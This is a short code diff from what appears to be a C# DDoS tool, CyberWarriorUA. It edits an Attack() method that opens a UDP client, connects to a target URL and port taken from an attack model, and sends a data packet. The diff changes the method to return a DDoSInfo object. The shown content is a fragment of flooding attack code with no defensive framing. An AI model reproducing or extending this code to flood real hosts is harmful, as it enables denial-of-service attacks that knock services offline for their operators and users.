@@ -11,7 +11,7 @@ namespace CyberWarriorUA.Services
         {
         }
 
-        public override async Task Attack()
+        public override async Task<DDoSInfo> Attack()
         {
             var udpClient = new UdpClient();
             udpClient.Connect(AttackModel.URL, AttackModel.Port);
@@ -20,6 +20,8 @@ namespace CyberWarriorUA.Services
             await udpClient.SendAsync(data, data.Length);
 
             udpClient.Close();
+
+            return new DDoSInfo();
         }
     }
 }
